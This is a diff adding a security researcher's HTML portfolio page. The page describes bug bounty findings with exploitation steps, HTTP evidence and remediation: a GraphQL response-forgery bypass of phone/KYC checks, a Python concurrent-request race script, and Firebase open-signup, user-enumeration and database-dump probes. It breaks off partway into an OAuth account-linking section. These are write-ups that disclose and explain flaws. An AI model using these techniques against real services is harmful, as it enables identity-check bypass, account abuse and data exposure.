@@ -1,0 +1,902 @@
+<title>Rishuraj Singh — Offensive Security</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;0,700;1,400&family=Inter:wght@400;500;600;700;800&display=swap">
+
+<style>
+:root{
+  --bg:#060a12;--surface:#0b1120;--card:#0f1a2e;--card2:#111f35;
+  --border:#1a2d4a;--border2:#223658;
+  --accent:#00d4ff;--accent2:#0af;--a-glow:rgba(0,212,255,.12);--a-border:rgba(0,212,255,.25);
+  --red:#ff4d6d;--r-dim:rgba(255,77,109,.10);--r-border:rgba(255,77,109,.28);
+  --orange:#ff8c42;--o-dim:rgba(255,140,66,.08);
+  --green:#00e5a0;--g-dim:rgba(0,229,160,.10);
+  --fg:#c8d8f0;--fg2:#6a85a8;--fg3:#2a3d5a;
+  --mono:'JetBrains Mono',monospace;--sans:'Inter',system-ui,sans-serif;
+  color-scheme:dark;
+}
+@media(prefers-color-scheme:light){:root:not([data-theme="dark"]){
+  --bg:#f0f4fc;--surface:#fff;--card:#f7f9fd;--card2:#eef2fa;
+  --border:#d4e0f0;--border2:#becbde;
+  --accent:#006fa8;--accent2:#008fcc;--a-glow:rgba(0,111,168,.08);--a-border:rgba(0,111,168,.22);
+  --red:#c0223c;--r-dim:rgba(192,34,60,.08);--r-border:rgba(192,34,60,.22);
+  --orange:#b85e00;--o-dim:rgba(184,94,0,.08);
+  --green:#008060;--g-dim:rgba(0,128,96,.08);
+  --fg:#18243a;--fg2:#50657e;--fg3:#a8bdd0;
+  color-scheme:light;
+}}
+:root[data-theme="dark"]{--bg:#060a12;--surface:#0b1120;--card:#0f1a2e;--card2:#111f35;--border:#1a2d4a;--border2:#223658;--accent:#00d4ff;--accent2:#0af;--a-glow:rgba(0,212,255,.12);--a-border:rgba(0,212,255,.25);--red:#ff4d6d;--r-dim:rgba(255,77,109,.10);--r-border:rgba(255,77,109,.28);--orange:#ff8c42;--o-dim:rgba(255,140,66,.08);--green:#00e5a0;--g-dim:rgba(0,229,160,.10);--fg:#c8d8f0;--fg2:#6a85a8;--fg3:#2a3d5a;color-scheme:dark}
+:root[data-theme="light"]{--bg:#f0f4fc;--surface:#fff;--card:#f7f9fd;--card2:#eef2fa;--border:#d4e0f0;--border2:#becbde;--accent:#006fa8;--accent2:#008fcc;--a-glow:rgba(0,111,168,.08);--a-border:rgba(0,111,168,.22);--red:#c0223c;--r-dim:rgba(192,34,60,.08);--r-border:rgba(192,34,60,.22);--orange:#b85e00;--o-dim:rgba(184,94,0,.08);--green:#008060;--g-dim:rgba(0,128,96,.08);--fg:#18243a;--fg2:#50657e;--fg3:#a8bdd0;color-scheme:light}
+
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--fg);font-family:var(--sans);font-size:15px;line-height:1.7;min-height:100vh}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline;opacity:.85}
+code{font-family:var(--mono);font-size:.85em}
+pre{font-family:var(--mono);font-size:.82em;overflow-x:auto}
+::-webkit-scrollbar{width:6px;height:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+
+/* NAV */
+nav{position:sticky;top:0;z-index:100;background:var(--bg);border-bottom:1px solid var(--border);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px)}
+.nav-inner{max-width:1100px;margin:auto;padding:0 24px;height:52px;display:flex;align-items:center;gap:24px}
+.nav-logo{font-family:var(--mono);font-weight:700;font-size:.9em;color:var(--accent);letter-spacing:.04em}
+.nav-links{display:flex;gap:20px;margin-left:auto;align-items:center}
+.nav-links a{font-size:.82em;font-weight:500;color:var(--fg2);letter-spacing:.03em;text-transform:uppercase}
+.nav-links a:hover{color:var(--accent);text-decoration:none}
+.theme-btn{background:none;border:1px solid var(--border);color:var(--fg2);border-radius:6px;padding:4px 10px;font-size:.78em;cursor:pointer;font-family:var(--mono);transition:border-color .2s,color .2s}
+.theme-btn:hover{border-color:var(--accent);color:var(--accent)}
+
+/* HERO */
+.hero{max-width:1100px;margin:auto;padding:80px 24px 56px}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;background:var(--a-glow);border:1px solid var(--a-border);border-radius:999px;padding:5px 14px;font-family:var(--mono);font-size:.72em;color:var(--accent);margin-bottom:28px;letter-spacing:.04em}
+.hero-badge::before{content:'';width:7px;height:7px;border-radius:50%;background:var(--accent);display:block;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.8)}}
+h1{font-size:clamp(2rem,5vw,3.4rem);font-weight:800;line-height:1.08;letter-spacing:-.03em;margin-bottom:16px}
+h1 span{color:var(--accent)}
+.hero-sub{font-size:1.05rem;color:var(--fg2);max-width:560px;margin-bottom:36px;line-height:1.65}
+.hero-links{display:flex;flex-wrap:wrap;gap:12px;align-items:center}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:10px 20px;border-radius:8px;font-size:.85em;font-weight:600;cursor:pointer;transition:all .18s;letter-spacing:.02em;border:none}
+.btn-primary{background:var(--accent);color:#060a12}
+.btn-primary:hover{opacity:.88;text-decoration:none;color:#060a12}
+.btn-outline{background:none;border:1px solid var(--border2);color:var(--fg);padding:9px 18px}
+.btn-outline:hover{border-color:var(--accent);color:var(--accent);text-decoration:none}
+
+/* STAT ROW */
+.stats{display:flex;flex-wrap:wrap;gap:0;border:1px solid var(--border);border-radius:14px;overflow:hidden;margin:64px 0 0}
+.stat{flex:1;min-width:140px;padding:24px 28px;position:relative}
+.stat+.stat{border-left:1px solid var(--border)}
+@media(max-width:600px){.stat+.stat{border-left:none;border-top:1px solid var(--border)}}
+.stat-n{font-size:2.2rem;font-weight:800;color:var(--accent);font-variant-numeric:tabular-nums;letter-spacing:-.04em;line-height:1}
+.stat-n.red{color:var(--red)}
+.stat-n.orange{color:var(--orange)}
+.stat-n.green{color:var(--green)}
+.stat-l{font-size:.75em;color:var(--fg2);margin-top:6px;font-weight:500;letter-spacing:.02em}
+
+/* SECTIONS */
+section{max-width:1100px;margin:auto;padding:72px 24px 0}
+.section-label{font-family:var(--mono);font-size:.72em;color:var(--accent);letter-spacing:.12em;text-transform:uppercase;margin-bottom:14px;display:flex;align-items:center;gap:10px}
+.section-label::after{content:'';flex:1;height:1px;background:var(--border)}
+h2{font-size:1.6rem;font-weight:800;letter-spacing:-.025em;margin-bottom:8px}
+.section-desc{color:var(--fg2);font-size:.95em;max-width:600px;margin-bottom:40px}
+
+/* FINDING CARDS */
+.findings{display:grid;gap:20px}
+.finding{border:1px solid var(--border);border-radius:14px;overflow:hidden;transition:border-color .2s}
+.finding:hover{border-color:var(--border2)}
+.finding.crit{border-color:var(--r-border)}
+.finding-head{padding:22px 24px;display:flex;align-items:flex-start;gap:16px;cursor:pointer;user-select:none}
+.sev{font-family:var(--mono);font-size:.68em;font-weight:700;letter-spacing:.06em;padding:3px 10px;border-radius:5px;white-space:nowrap;flex-shrink:0;margin-top:3px}
+.sev.crit{background:var(--r-dim);color:var(--red);border:1px solid var(--r-border)}
+.sev.high{background:var(--o-dim);color:var(--orange);border:1px solid rgba(255,140,66,.28)}
+.sev.med{background:var(--g-dim);color:var(--green);border:1px solid rgba(0,229,160,.28)}
+.sev.info{background:var(--a-glow);color:var(--accent);border:1px solid var(--a-border)}
+.finding-meta{flex:1;min-width:0}
+.finding-title{font-weight:700;font-size:1rem;line-height:1.3;margin-bottom:6px}
+.finding-tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
+.tag{font-family:var(--mono);font-size:.68em;background:var(--card);border:1px solid var(--border);color:var(--fg2);padding:2px 8px;border-radius:4px}
+.finding-platform{font-family:var(--mono);font-size:.7em;color:var(--fg2);display:flex;align-items:center;gap:6px;flex-shrink:0}
+.finding-platform .dot{width:6px;height:6px;border-radius:50%;background:var(--green);flex-shrink:0}
+.finding-platform .dot.orange{background:var(--orange)}
+.finding-platform .dot.pending{background:var(--fg3)}
+.chevron{margin-left:8px;color:var(--fg3);font-size:1.1em;transition:transform .22s}
+.finding.open .chevron{transform:rotate(180deg)}
+.finding-body{display:none;padding:0 24px 24px}
+.finding.open .finding-body{display:block}
+
+/* HTTP BLOCK */
+.http-wrap{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin:16px 0}
+.http-label{padding:8px 16px;background:var(--card2);border-bottom:1px solid var(--border);font-family:var(--mono);font-size:.7em;color:var(--fg2);display:flex;align-items:center;justify-content:space-between}
+.http-label span{color:var(--fg3)}
+.method{font-weight:700;color:var(--accent);margin-right:6px}
+.method.post{color:var(--orange)}
+.method.get{color:var(--green)}
+.http-body{padding:14px 16px}
+.http-body pre{color:var(--fg);white-space:pre-wrap;word-break:break-all}
+.hl-key{color:#79c0ff}
+.hl-str{color:#a5d6ff}
+.hl-val-t{color:var(--green)}
+.hl-val-f{color:var(--red)}
+.hl-num{color:var(--orange)}
+.hl-method{color:var(--accent);font-weight:700}
+.hl-host{color:var(--orange)}
+.hl-path{color:var(--fg)}
+.hl-header{color:#d2a8ff}
+.hl-comment{color:var(--fg2);font-style:italic}
+.response-indicator{display:inline-flex;align-items:center;gap:6px;font-family:var(--mono);font-size:.72em;padding:4px 10px;border-radius:5px;margin:8px 0}
+.response-indicator.ok{background:var(--g-dim);color:var(--green)}
+.response-indicator.err{background:var(--r-dim);color:var(--red)}
+.response-indicator.mod{background:var(--a-glow);color:var(--accent)}
+
+/* STEP LIST */
+.steps{counter-reset:step;list-style:none;display:flex;flex-direction:column;gap:12px;margin:16px 0}
+.steps li{display:flex;gap:14px;align-items:flex-start}
+.steps li::before{counter-increment:step;content:counter(step);min-width:26px;height:26px;border-radius:50%;background:var(--a-glow);border:1px solid var(--a-border);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:.72em;font-weight:700;color:var(--accent);flex-shrink:0;margin-top:2px}
+.steps li p{color:var(--fg2);font-size:.92em;line-height:1.6}
+.steps li code{background:var(--card2);border:1px solid var(--border);padding:1px 5px;border-radius:3px;color:var(--fg);font-size:.88em}
+
+/* IMPACT / PATCH BOXES */
+.box-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:18px 0}
+@media(max-width:600px){.box-grid{grid-template-columns:1fr}}
+.box{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:18px 20px}
+.box-title{font-size:.72em;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--fg2);margin-bottom:10px;font-family:var(--mono)}
+.box.impact .box-title{color:var(--red)}
+.box.patch .box-title{color:var(--green)}
+.box ul{list-style:none;display:flex;flex-direction:column;gap:7px}
+.box ul li{font-size:.88em;color:var(--fg2);padding-left:14px;position:relative;line-height:1.5}
+.box ul li::before{content:'›';position:absolute;left:0;color:var(--fg3);font-weight:700}
+.box.impact ul li::before{color:var(--red)}
+.box.patch ul li::before{color:var(--green)}
+
+/* WHITEPAPER */
+.wp{background:var(--surface);border:1px solid var(--border);border-radius:16px;overflow:hidden;margin-top:0}
+.wp-head{padding:32px 36px;border-bottom:1px solid var(--border)}
+.wp-meta{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:14px;align-items:center}
+.wp-chip{font-family:var(--mono);font-size:.7em;padding:3px 10px;border-radius:4px;border:1px solid var(--border);color:var(--fg2);background:var(--card)}
+.wp-chip.pub{border-color:var(--a-border);color:var(--accent);background:var(--a-glow)}
+.wp-title{font-size:1.45rem;font-weight:800;letter-spacing:-.025em;line-height:1.25;margin-bottom:10px}
+.wp-byline{font-size:.85em;color:var(--fg2)}
+.wp-byline strong{color:var(--fg)}
+.wp-body{padding:32px 36px}
+.wp-section{margin-bottom:36px}
+.wp-section:last-child{margin-bottom:0}
+.wp-h{font-family:var(--mono);font-size:.72em;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:14px;display:flex;align-items:center;gap:10px}
+.wp-h::after{content:'';flex:1;height:1px;background:var(--border)}
+.wp-h2{font-size:1.05rem;font-weight:700;margin-bottom:10px;color:var(--fg)}
+.wp-p{font-size:.92em;color:var(--fg2);margin-bottom:12px;line-height:1.7}
+.wp-p:last-child{margin-bottom:0}
+.wp-p code{background:var(--card2);border:1px solid var(--border);padding:1px 5px;border-radius:3px;color:var(--fg)}
+.finding-note{background:var(--r-dim);border:1px solid var(--r-border);border-radius:8px;padding:14px 16px;margin:16px 0;font-size:.88em;color:var(--fg2)}
+.finding-note strong{color:var(--red)}
+.note-info{background:var(--a-glow);border:1px solid var(--a-border);border-radius:8px;padding:14px 16px;margin:16px 0;font-size:.88em;color:var(--fg2)}
+.note-info strong{color:var(--accent)}
+.note-patch{background:var(--g-dim);border:1px solid rgba(0,229,160,.25);border-radius:8px;padding:14px 16px;margin:16px 0;font-size:.88em;color:var(--fg2)}
+.note-patch strong{color:var(--green)}
+
+/* PLATFORM GRID */
+.platform-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+@media(max-width:600px){.platform-grid{grid-template-columns:1fr}}
+.platform-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:22px 20px;transition:border-color .2s}
+.platform-card:hover{border-color:var(--border2)}
+.platform-name{font-weight:700;margin-bottom:4px;font-size:.95em}
+.platform-handle{font-family:var(--mono);font-size:.72em;color:var(--accent);margin-bottom:14px}
+.platform-stats{display:flex;flex-direction:column;gap:6px}
+.pstat{display:flex;justify-content:space-between;align-items:center;font-size:.8em}
+.pstat-l{color:var(--fg2)}
+.pstat-v{font-weight:700;font-family:var(--mono);color:var(--fg)}
+.pstat-v.good{color:var(--green)}
+.pstat-v.hot{color:var(--orange)}
+
+/* FOOTER */
+footer{max-width:1100px;margin:auto;padding:48px 24px 56px;border-top:1px solid var(--border);margin-top:80px;display:flex;flex-wrap:wrap;gap:16px;align-items:center;justify-content:space-between}
+.footer-l{font-family:var(--mono);font-size:.75em;color:var(--fg3)}
+.footer-links{display:flex;gap:16px}
+.footer-links a{font-size:.8em;color:var(--fg2)}
+.footer-links a:hover{color:var(--accent);text-decoration:none}
+
+/* RESPONSIVE */
+@media(max-width:700px){
+  .nav-links .nav-link-hide{display:none}
+  h1{font-size:2rem}
+  .wp-head,.wp-body{padding:22px 20px}
+  .stats{flex-direction:column}
+}
+</style>
+
+<nav>
+  <div class="nav-inner">
+    <span class="nav-logo">rishuraj@labs:~$</span>
+    <div class="nav-links">
+      <a href="#lhe" class="nav-link-hide">LHE</a>
+      <a href="#findings" class="nav-link-hide">Findings</a>
+      <a href="#platforms">Platforms</a>
+      <button class="theme-btn" onclick="toggleTheme()">[ theme ]</button>
+    </div>
+  </div>
+</nav>
+
+<div class="hero">
+  <div class="hero-badge">HackerOne Live Hacking Event Finalist</div>
+  <h1>Rishuraj Singh<br><span>Offensive Security</span></h1>
+  <p class="hero-sub">
+    Application security researcher. <strong style="color:var(--fg)">10+ HackerOne LHE invitations</strong> across India — placed #3 at LHE Patna (twice) and #7 at LHE Bengaluru. Specializing in authentication logic, GraphQL attack surfaces, and OAuth vulnerabilities.
+  </p>
+  <div class="hero-links">
+    <a href="mailto:rishuraj2666@gmail.com" class="btn btn-primary">rishuraj2666@gmail.com</a>
+    <a href="https://rishuraj2666.github.io" class="btn btn-outline" target="_blank">rishuraj2666.github.io</a>
+    <a href="#research" class="btn btn-outline">↓ Research</a>
+  </div>
+
+  <div class="stats">
+    <div class="stat">
+      <div class="stat-n red">#3</div>
+      <div class="stat-l">LHE Patna (×2)</div>
+    </div>
+    <div class="stat">
+      <div class="stat-n orange">#7</div>
+      <div class="stat-l">LHE Bengaluru</div>
+    </div>
+    <div class="stat">
+      <div class="stat-n green">90%</div>
+      <div class="stat-l">Bugcrowd Signal Accuracy</div>
+    </div>
+    <div class="stat">
+      <div class="stat-n" style="color:var(--accent)">10+</div>
+      <div class="stat-l">LHE Invitations</div>
+    </div>
+  </div>
+</div>
+
+<!-- ACADEMIC -->
+<section>
+  <div class="section-label">Background</div>
+  <h2>Academic Foundation</h2>
+  <p class="section-desc">Formal training in security theory, algorithms, and system design — applied directly to real-world bug bounty research.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;max-width:700px">
+    <div class="platform-card">
+      <div class="platform-name">IIIT Bangalore</div>
+      <div class="platform-handle" style="color:var(--fg2)">PGP · Cybersecurity</div>
+      <div style="font-size:.82em;color:var(--fg2)">Post Graduate Program with focus on application security, cryptography, and threat modeling.</div>
+    </div>
+    <div class="platform-card">
+      <div class="platform-name">IIT Mandi</div>
+      <div class="platform-handle" style="color:var(--fg2)">Academic Minors · CSE & Advanced Technologies</div>
+      <div style="font-size:.82em;color:var(--fg2)">Systems, algorithms, and engineering fundamentals underpinning low-level security research.</div>
+    </div>
+  </div>
+</section>
+
+<!-- FINDINGS -->
+<section id="findings">
+  <div class="section-label">Vulnerability Research</div>
+  <h2>Selected Findings</h2>
+  <p class="section-desc">Click any finding to expand the technical breakdown, request/response evidence, and remediation notes. OAuth research also published on <a href="https://medium.com/@rishuraj2666" target="_blank">Medium</a>.</p>
+
+  <div class="findings">
+
+    <!-- FINDING 1 -->
+    <div class="finding crit" onclick="toggleFinding(this)">
+      <div class="finding-head">
+        <span class="sev crit">CRITICAL</span>
+        <div class="finding-meta">
+          <div class="finding-title">GraphQL Boolean State Injection → KYC / Phone Verification Bypass</div>
+          <div style="font-size:.85em;color:var(--fg2);margin-top:4px">
+            Client-side routing trusts a forged <code>verifyPhone: true</code> response without any server-side nonce validation, allowing complete bypass of multi-step identity verification.
+          </div>
+          <div class="finding-tags">
+            <span class="tag">GraphQL</span>
+            <span class="tag">Auth Bypass</span>
+            <span class="tag">Client-Side Trust</span>
+            <span class="tag">KYC</span>
+            <span class="tag">Burp Match/Replace</span>
+          </div>
+        </div>
+        <div class="finding-platform">
+          <span class="dot orange"></span> Responsible Disclosure Pending
+          <span class="chevron">▾</span>
+        </div>
+      </div>
+      <div class="finding-body">
+        <div class="finding-note">
+          <strong>⚠ Pending Disclosure</strong> — Target identity withheld pending vendor patch. Full PoC and HTTP evidence on file. This is a summary of the attack chain.
+        </div>
+
+        <div style="margin-bottom:20px">
+          <div class="wp-h2">Vulnerability Summary</div>
+          <p class="wp-p">
+            The target is a multi-tenant financial platform running KYC onboarding through a GraphQL API. The <code>verifyPhone</code> mutation returns a boolean that the client-side state manager (Apollo Client / Redux) uses to gate the next onboarding step. The backend issues no cryptographic session token to prove that verification actually succeeded — the gate lives entirely in frontend routing logic.
+          </p>
+        </div>
+
+        <div style="margin-bottom:20px">
+          <div class="wp-h2">Step-by-Step Exploitation</div>
+          <ol class="steps">
+            <li><p>Start onboarding. Enter an arbitrary phone number. The platform dispatches a <code>verifyPhone</code> GraphQL mutation with a OTP token.</p></li>
+            <li><p>In Burp Suite, set a <strong>Match & Replace</strong> rule scoped to the response from <code>/graphql</code>. Match the full error payload (shown below) and replace it with the forged success payload.</p></li>
+            <li><p>Submit any random 6-digit OTP. The real server returns HTTP 200 with an error object — Burp intercepts it mid-stream.</p></li>
+            <li><p>Burp's response replacement fires: the error JSON is swapped for <code>{"data":{"verifyPhone":true}}</code>. The tampered response reaches the browser.</p></li>
+            <li><p>Apollo Client reads <code>data.verifyPhone === true</code>, updates its local cache, and the React router unlocks the next onboarding step. Phone is now "verified" without ever receiving a valid OTP.</p></li>
+          </ol>
+        </div>
+
+        <div style="margin-bottom:20px">
+          <div class="wp-h2">Request → Real Error → Forged Response</div>
+
+          <div class="http-wrap">
+            <div class="http-label">
+              <span><span class="method post">POST</span> <span class="hl-host">api-sandbox.target.com</span><span class="hl-path">/graphql</span></span>
+              <span>REQUEST</span>
+            </div>
+            <div class="http-body"><pre>
+<span class="hl-header">Content-Type:</span> application/json
+<span class="hl-header">Authorization:</span> Bearer &lt;session_token&gt;
+
+{
+  <span class="hl-key">"query"</span>: <span class="hl-str">"mutation { verifyPhone(token: \"123456\") }"</span>
+}</pre>
+            </div>
+          </div>
+
+          <div class="http-wrap">
+            <div class="http-label">
+              <span>SERVER RESPONSE (real)</span>
+              <span class="response-indicator err">HTTP 200 · error</span>
+            </div>
+            <div class="http-body"><pre>
+{
+  <span class="hl-key">"errors"</span>: [
+    {
+      <span class="hl-key">"message"</span>: <span class="hl-str">"Validation Failed"</span>,
+      <span class="hl-key">"path"</span>: [<span class="hl-str">"verifyPhone"</span>],
+      <span class="hl-key">"code"</span>: <span class="hl-num">400</span>,
+      <span class="hl-key">"errors"</span>: {
+        <span class="hl-key">"token"</span>: [{ <span class="hl-key">"code"</span>: <span class="hl-str">"invalid"</span>, <span class="hl-key">"message"</span>: <span class="hl-str">"This value is not valid"</span> }]
+      }
+    }
+  ],
+  <span class="hl-key">"data"</span>: <span class="hl-val-f">null</span>
+}</pre>
+            </div>
+          </div>
+
+          <div class="http-wrap">
+            <div class="http-label">
+              <span>BURP MATCH/REPLACE → FORGED RESPONSE</span>
+              <span class="response-indicator mod">manipulated</span>
+            </div>
+            <div class="http-body"><pre>
+{
+  <span class="hl-key">"data"</span>: {
+    <span class="hl-key">"verifyPhone"</span>: <span class="hl-val-t">true</span>   <span class="hl-comment">// ← injected; server never issued this</span>
+  }
+}
+<span class="hl-comment">
+// Client-side Apollo cache update:
+// cache.writeQuery({ verifyPhone: true })
+// Router: step === 'verified' → navigate('/onboarding/identity')
+// Backend KYC gate: never checked on next mutation</span></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="box-grid">
+          <div class="box impact">
+            <div class="box-title">Impact</div>
+            <ul>
+              <li>Phone verification bypassed without owning the number</li>
+              <li>KYC onboarding wall removed for restricted financial services</li>
+              <li>Account can advance to identity upload / funding steps</li>
+              <li>Chaining possible: combine with other logic flaws for full account takeover</li>
+            </ul>
+          </div>
+          <div class="box patch">
+            <div class="box-title">Remediation</div>
+            <ul>
+              <li>Issue a signed, short-lived <code>stateVerificationToken</code> (HMAC/JWT) on real OTP success</li>
+              <li>All subsequent mutations must present this token; verify server-side before proceeding</li>
+              <li>Return HTTP 4xx (not 200) for validation errors — never 200 with an error body</li>
+              <li>Do not gate step transitions on client-readable booleans alone</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FINDING 2 -->
+    <div class="finding" onclick="toggleFinding(this)">
+      <div class="finding-head">
+        <span class="sev high">HIGH</span>
+        <div class="finding-meta">
+          <div class="finding-title">Authentication State Race Condition — Concurrent Session Exploit</div>
+          <div style="font-size:.85em;color:var(--fg2);margin-top:4px">
+            Multi-threaded concurrent requests during a narrow authentication window allow session state desynchronization, enabling privilege escalation under certain backend timing conditions.
+          </div>
+          <div class="finding-tags">
+            <span class="tag">Race Condition</span>
+            <span class="tag">Session Logic</span>
+            <span class="tag">Concurrency</span>
+            <span class="tag">TOCTOU</span>
+          </div>
+        </div>
+        <div class="finding-platform">
+          <span class="dot orange"></span> Pending
+          <span class="chevron">▾</span>
+        </div>
+      </div>
+      <div class="finding-body">
+        <div class="note-info">
+          <strong>Research Context</strong> — Race condition identified during multi-tenant session analysis. The following documents the vulnerability class and PoC methodology.
+        </div>
+
+        <div style="margin-bottom:20px">
+          <div class="wp-h2">Vulnerability Mechanism</div>
+          <p class="wp-p">
+            Between an OTP/verification request and the server-side state commit, there is a finite window (typically 10–200ms) where the server has not yet locked the session record. Firing concurrent requests during this window can cause the backend to process two requests against the same pre-commit state — resulting in double-processing, state corruption, or privilege escalation.
+          </p>
+        </div>
+
+        <div style="margin-bottom:20px">
+          <div class="wp-h2">Concurrent Request PoC</div>
+          <div class="http-wrap">
+            <div class="http-label"><span>CONCURRENCY ENGINE</span><span>Python · ThreadPoolExecutor</span></div>
+            <div class="http-body"><pre>
+<span class="hl-comment"># Fire N concurrent state-transition requests in the same millisecond window
+# Goal: backend processes two requests before either commits to DB</span>
+
+import requests, concurrent.futures, time
+
+TARGET  = <span class="hl-str">"https://api.target.com/graphql"</span>
+TOKEN   = <span class="hl-str">"&lt;session_token_at_pre-verification-state&gt;"</span>
+HEADERS = {<span class="hl-str">"Authorization"</span>: <span class="hl-str">f"Bearer {TOKEN}"</span>, <span class="hl-str">"Content-Type"</span>: <span class="hl-str">"application/json"</span>}
+PAYLOAD = {<span class="hl-str">"query"</span>: <span class="hl-str">"mutation { triggerStateTransition(action: \"advance\") { status } }"</span>}
+
+def fire(thread_id):
+    r = requests.post(TARGET, json=PAYLOAD, headers=HEADERS, timeout=5)
+    print(f<span class="hl-str">"[{thread_id}] {r.status_code}: {r.text[:120]}"</span>)
+
+<span class="hl-comment"># All threads fire simultaneously — maximize overlap in the race window</span>
+barrier = [None]
+def synchronized_fire(tid):
+    while barrier[0] is None: pass
+    fire(tid)
+
+threads = []
+with concurrent.futures.ThreadPoolExecutor(max_workers=<span class="hl-num">10</span>) as ex:
+    futs = [ex.submit(synchronized_fire, i) for i in range(<span class="hl-num">10</span>)]
+    time.sleep(<span class="hl-num">0.1</span>)
+    barrier[<span class="hl-num">0</span>] = True
+    concurrent.futures.wait(futs)</pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="box-grid">
+          <div class="box impact">
+            <div class="box-title">Impact</div>
+            <ul>
+              <li>State transition processed twice under race → privilege escalation</li>
+              <li>Potential double-credit / double-resource allocation</li>
+              <li>Session desync: frontend and backend in inconsistent states</li>
+            </ul>
+          </div>
+          <div class="box patch">
+            <div class="box-title">Remediation</div>
+            <ul>
+              <li>Atomic DB operations / row-level locking on state transitions</li>
+              <li>Idempotency keys per transition request</li>
+              <li>Backend validation: reject second request if state already advanced</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FINDING 3 -->
+    <div class="finding" onclick="toggleFinding(this)">
+      <div class="finding-head">
+        <span class="sev med">MEDIUM</span>
+        <div class="finding-meta">
+          <div class="finding-title">Firebase Authentication Misconfiguration — Open Signup + User Enumeration</div>
+          <div style="font-size:.85em;color:var(--fg2);margin-top:4px">
+            Firebase REST API exposed without restrictions: open account creation, user enumeration via error differentiation, and unauthenticated RTDB rule probing.
+          </div>
+          <div class="finding-tags">
+            <span class="tag">Firebase</span>
+            <span class="tag">Auth Bypass</span>
+            <span class="tag">User Enumeration</span>
+            <span class="tag">Misconfiguration</span>
+          </div>
+        </div>
+        <div class="finding-platform">
+          <span class="dot orange"></span> Informative / Duplicate
+          <span class="chevron">▾</span>
+        </div>
+      </div>
+      <div class="finding-body">
+        <div class="note-info">
+          <strong>Research Note</strong> — Reported to Remitly (Bugcrowd). Email verification bypass classified Informative; OAuth account merge classified Duplicate. Documented here as a research pattern for Firebase targets.
+        </div>
+
+        <div style="margin-bottom:20px">
+          <div class="wp-h2">Discovery Flow</div>
+          <ol class="steps">
+            <li><p>Extract Firebase API key from JavaScript bundles or <code>google-services.json</code> — always present client-side.</p></li>
+            <li><p>POST to <code>identitytoolkit.googleapis.com/v1/accounts:signUp?key=&lt;API_KEY&gt;</code> with a fresh email. If it returns a new <code>idToken</code>, open registration is enabled regardless of the app's UI.</p></li>
+            <li><p>Use <code>accounts:signInWithPassword</code> with a known email + wrong password. Differentiating error codes (<code>EMAIL_NOT_FOUND</code> vs <code>INVALID_PASSWORD</code>) enables user enumeration at scale.</p></li>
+            <li><p>Probe RTDB: <code>GET https://&lt;project&gt;.firebaseio.com/.json</code>. If rules are unset or misconfigured, the entire database dumps unauthenticated.</p></li>
+          </ol>
+        </div>
+
+        <div class="http-wrap">
+          <div class="http-label"><span><span class="method post">POST</span> identitytoolkit.googleapis.com</span><span>Open Signup Test</span></div>
+          <div class="http-body"><pre>
+POST /v1/accounts:signUp?key=<span class="hl-str">AIzaXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+Content-Type: application/json
+
+{
+  <span class="hl-key">"email"</span>:    <span class="hl-str">"attacker@example.com"</span>,
+  <span class="hl-key">"password"</span>: <span class="hl-str">"Attacker@123"</span>,
+  <span class="hl-key">"returnSecureToken"</span>: <span class="hl-val-t">true</span>
+}
+
+<span class="hl-comment">// Vulnerable response:
+// HTTP 200 → idToken issued → account created without invite or restriction
+// Fixed response:
+// HTTP 400 → { "error": { "code": 400, "message": "OPERATION_NOT_ALLOWED" } }</span></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FINDING 4 -->
+    <div class="finding" onclick="toggleFinding(this)">
+      <div class="finding-head">
+        <span class="sev high">HIGH</span>
+        <div class="finding-meta">
+          <div class="finding-title">Breaking Google OAuth — Account Takeover via Federated Identity Merge</div>
+          <div style="font-size:.85em;color:var(--fg2);margin-top:4px">
+            Google OAuth flow allows an attacker to pre-link a victim's email to an attacker-controlled account via unvalidated identity federation, enabling silent account takeover when the victim later signs in with Google.
+          </div>
+          <div class="finding-tags">
+            <span class="tag">OAuth 2.0</span>
+            <span class="tag">Account Takeover</span>
+            <span class="tag">Identity Federation</span>
+            <span class="tag">Google</span>
+            <span class="tag">Pre-Account Linking</span>
+          </div>
+        </div>
+        <div class="finding-platform">
+          <span class="dot" style="background:var(--accent)"></span>
+          <a href="https://medium.com/@rishuraj2666" target="_blank" onclick="event.stopPropagation()" style="color:var(--accent);font-size:.7em">medium.com/@rishuraj2666</a>
+          <span class="chevron">▾</span>
+        </div>
+      </div>
+      <div class="finding-body">
+        <div class="note-info">
+          <strong>Published Research</strong> — Full write-up at <a href="https://medium.com/@rishuraj2666" target="_blank">medium.com/@rishuraj2666</a> · "Breaking Google OAuth" (September 2026). Documented here as a condensed technical summary.
+        </div>
+
+        <div style="margin-bottom:20px">
+          <div class="wp-h2">Vulnerability Class: OAuth Pre-Account Linking</div>
+          <p class="wp-p">
